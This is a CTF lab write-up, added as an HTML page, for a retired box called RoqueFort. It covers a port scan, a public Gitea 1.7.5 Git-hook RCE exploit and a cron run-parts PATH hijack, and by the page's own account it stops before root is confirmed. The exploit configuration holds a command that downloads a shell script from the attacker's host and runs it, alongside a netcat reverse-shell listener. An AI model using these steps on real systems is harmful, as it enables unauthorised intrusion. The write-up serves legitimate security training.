@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>RoqueFort &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>RoqueFort</h1>
+    <div class="meta">Target: <code>192.168.45.244</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Gitea</span><span class="tag">RCE</span><span class="tag">CVE</span><span class="tag">CronJob</span><span class="tag">run-parts</span><span class="tag">PathHijack</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#gitea-1-7-5-rce">Gitea 1.7.5 RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#root-cron-job-with-run-parts-attempted">Root Cron Job with run-parts (Attempted)</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>RoqueFort is a Linux box running Gitea 1.7.5 on port 3000. A public RCE exploit for this version creates a repository with a malicious Git hook, landing a shell as <code>chloe</code>. The privilege escalation involves a root cron job that calls <code>run-parts</code>, but the notes document the intended technique without confirming completion, so this writeup covers what was attempted.</p>
+<blockquote>
+<p><strong>Note:</strong> these notes are incomplete, the foothold and initial user access are fully documented; the privilege escalation technique (placing a binary named <code>run-parts</code> in <code>/usr/local/bin</code>) is described but the notes end before root was confirmed. Written as in-progress.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     ProFTPD 1.3.5b
+22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7
+2222/tcp open  ssh     Dropbear sshd 2016.74
+3000/tcp open  http    Gitea
+</code></pre>
+<p>Port 3000 presents the Gitea interface. The version is visible at the bottom of the landing page:</p>
+<pre><code>Gitea Version: 1.7.5
+</code></pre>
+<p>Searching ExploitDB for this version:</p>
+<p><strong>Gitea 1.7.5 - Remote Code Execution</strong>
+https://www.exploit-db.com/exploits/49383</p>
+<blockquote>
+<p><strong>How Gitea RCE works at this version:</strong> The exploit registers a new user account on the Gitea instance, creates a repository, and then abuses Git hooks (specifically the <code>post-receive</code> hook) which execute server-side when a push is received. The hook runs as the Gitea process user. An attacker pushes to the repository, the hook fires, and a reverse shell executes.</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="gitea-1-7-5-rce">Gitea 1.7.5 RCE</h3>
+<p>The exploit script requires a pre-created user account matching the credentials hardcoded in the script. An account was registered manually on the Gitea instance before running the exploit:</p>
+<pre><code>Username: newadmin
+Password: ‹redacted›
+</code></pre>
+<p>The exploit was edited with the correct parameters:</p>
+<pre><code class="language-python">USERNAME = &quot;newadmin&quot;
+PASSWORD = &quot;‹redacted›&quot;
+HOST_ADDR = '192.168.45.244'
+HOST_PORT = 3000
+URL = 'http://192.168.180.67:3000'
+CMD = 'wget http://192.168.45.244:21/shell.sh &amp;&amp; bash shell.sh'
+</code></pre>
+<p>After running the exploit, a shell arrives as <code>chloe</code> on port 2222:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 2222
+connect to [192.168.45.244] from (UNKNOWN) [192.168.180.67] 37164
+whoami
+chloe
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">/usr/bin/script -qc /bin/bash /dev/null
+chloe@roquefort:~/gitea-repositories/newadmin/bmxzyvvf.git$
+</code></pre>
+<p>Local flag:</p>
+<pre><code class="language-sh">chloe@roquefort:~$ cat local.txt
+‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="root-cron-job-with-run-parts-attempted">Root Cron Job with run-parts (Attempted)</h3>
+<p>Examining <code>/etc/crontab</code> reveals a root job:</p>
+<pre><code class="language-sh">*/5 * * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+</code></pre>
+<blockquote>
+<p><strong>Why PATH hijacking <code>run-parts</code> could work:</strong> <code>run-parts</code> is called without an absolute path here, meaning the shell will search <code>$PATH</code> for it. If a directory earlier in the PATH (like <code>/usr/local/bin</code>) is writable and an attacker places a malicious binary named <code>run-parts</code> there, the cron job will execute it as root instead of the real <code>run-parts</code>. This is a classic PATH hijacking technique.</p>
+</blockquote>
+<p>A binary named <code>run-parts</code> was placed in <code>/usr/local/bin</code>. However, the cron triggers <code>/etc/cron.hourly</code>, meaning the job fires every 5 minutes but only executes scripts inside <code>/etc/cron.hourly</code>, not an arbitrary shell payload, unless the fake <code>run-parts</code> itself spawns one. The notes end here without confirming a root shell was received.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Gitea Git hook RCE requires a valid user account.</strong> The exploit itself isn't truly unauthenticated, register first, then run the exploit. The registration step is critical and easy to miss when reading the exploit code.</li>
+<li><strong>Dropbear SSH on a non-standard port is worth noting.</strong> Port 2222 ran a different SSH daemon (Dropbear 2016) alongside OpenSSH on 22, which may indicate a separate service or restricted access path.</li>
+<li><strong>PATH hijacking works when cron doesn't use absolute paths.</strong> Any <code>run-parts</code>, <code>backup</code>, or custom binary called without a full path in a cron script is a potential hijack target if any early-PATH directory is writable.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
